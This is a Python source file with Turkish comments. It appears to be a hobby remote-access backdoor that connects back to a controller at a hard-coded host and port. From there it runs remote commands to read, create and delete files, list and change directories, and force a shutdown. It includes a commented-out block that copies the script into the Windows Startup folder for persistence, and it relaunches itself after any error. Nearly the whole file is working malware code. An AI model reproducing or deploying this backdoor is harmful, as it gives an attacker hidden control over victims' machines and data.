import socket
import os
import time
import subprocess
import sys

host="127.0.0.1"
port=2505


"""
#kalıcılık----------------------------------------------------
pyname=os.path.basename(__file__)
print(pyname)
exename=pyname.replace(".py",".exe")
print(exename)
os.system(f"copy {pyname} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\startup\" ")
#kalıcılık-----------------------------------------------------
"""

def main():
    try:
        #baglantı-------------------------------------------
        while True:
            try:
                Baglantı=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                Baglantı.connect((host,port))
                break
            except Exception as e:
                print(e)
                time.sleep(5)
        #baglantı------------------------------------------------

        while True:
            emir=Baglantı.recv(16384).decode("utf-8")
            dizinimiz=os.getcwd()

            if emir=="kapat":
                os.system("shutdown -s -t 3")
                response="kapatılıyor"
#-------------------DOSYA VE DİZİN İŞLEMLERİ-----------------------------
            elif emir.startswith("cd"):
                dizinimiz=emir.split()
                dizinimiz=dizinimiz[1]
                os.chdir(dizinimiz)
                response="dizin değiştirildi"
            
            elif emir=="pwd":
                response=dizinimiz
            
            elif emir=="cd ..":
                oncekıdızın=os.path.dirname(dizinimiz)
                os.chdir(oncekıdızın)
                response="dizin değiştirildi"

            elif emir.startswith("touch"):
                touch=emir.split()
                touch=touch[1]
                with open(touch,"w")as file:
                    file.write("")
                response=f"dosya oluşturuldu {touch}"

            elif emir.startswith("rm"):
                rm=emir.split()
                rm=rm[1]
                os.remove(rm)
                response="dosya silindi"

            elif emir=="ls":
                dosyalar=os.listdir()
                response="\n".join(dosyalar)

            elif emir.startswith("cat"):
                cat=emir.split()
                cat=cat[1]
                with open(cat,"r")as file:
                    response=file.read()
#-------------------DOSYA VE DİZİN İŞLEMLERİ-----------------------------
            else:
                response="GEÇERSİZ EMİR"
            
            Baglantı.send(response.encode("utf-8"))
            


    except Exception as e:
        print(e)
        time.sleep(5)
        subprocess.run([sys.executable, *sys.argv])

main()
